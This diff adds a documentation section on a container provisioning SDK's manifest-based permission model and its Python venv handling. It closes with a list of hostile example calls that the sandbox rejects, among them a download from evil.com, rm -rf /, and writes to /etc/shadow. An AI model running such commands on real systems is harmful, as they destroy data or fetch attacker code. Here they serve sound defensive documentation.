@@ -152,6 +152,53 @@ This approach:
 - **Load a different driver version**: The kernel module is the host's; userspace must match
 - **Access GPU devices not passed through**: Only explicitly configured devices are visible
 
+## Provisioning SDK Permissions
+
+Install scripts run inside the target LXC container via `pct exec`. The Python SDK enforces a permission model declared in each app's `app.yml` manifest — scripts cannot perform actions not listed in their `permissions:` block.
+
+### Permission categories
+
+| Category | Manifest key | What it controls |
+|----------|-------------|------------------|
+| System packages | `packages` | `pkg_install()` — only listed packages can be installed via apk/apt |
+| Pip packages | `pip` | `pip_install()` — only listed pip packages can be installed |
+| URLs | `urls` | `download()`, `add_apt_key()`, `add_apt_repo()` — only listed URLs (supports wildcards) |
+| Filesystem paths | `paths` | `create_dir()`, `create_venv()`, file operations — only under listed path prefixes |
+| Commands | `commands` | `run_command()` — only listed binary names (supports wildcards) |
+| Services | `services` | `enable_service()` — only listed service names |
+| Users | `users` | `create_user()` — only listed usernames |
+
+### Implicitly allowed paths
+
+The following paths are always permitted without manifest declaration:
+
+| Path | Reason |
+|------|--------|
+| `/tmp` | Standard scratch space for downloads and temporary files |
+| `/opt/venv` | Default Python virtual environment (see below) |
+
+### Python virtual environments (PEP 668)
+
+Modern Linux distributions (Alpine 3.22+, Debian 12+, Ubuntu 24.04+) mark the system Python as "externally managed" per PEP 668, refusing system-wide `pip install`. The SDK handles this transparently:
+
+1. `pip_install()` auto-creates a venv at `/opt/venv` on first call
+2. All pip packages are installed into the venv, never system-wide
+3. The venv path is implicitly allowed (no manifest entry needed)
+4. Apps can use `pip_install(venv="/opt/venv/myapp")` for explicit per-service isolation
+5. `create_venv()` remains available for manual control (requires `paths` permission)
+
+### What a malicious install script cannot do
+
+Even if an app's `install.py` is compromised:
+
+- **Install unlisted packages**: `pkg_install("backdoor")` raises `PermissionDeniedError`
+- **Download from arbitrary URLs**: `download("http://evil.com/...")` is rejected unless the URL matches a `urls` pattern
+- **Write to arbitrary paths**: `create_dir("/etc/shadow")` fails — only declared path prefixes are allowed
+- **Run arbitrary commands**: `run_command(["rm", "-rf", "/"])` fails — `rm` must be in `commands`
+- **Create arbitrary users**: `create_user("root")` fails unless `root` is in `users`
+- **Enable arbitrary services**: `enable_service("sshd")` fails unless `sshd` is in `services`
+- **Escape the container**: Scripts run inside the LXC container via `pct exec`, not on the host
+
 ## Pool and Tag Boundaries
 
 - The service only manages containers within its configured Proxmox pool
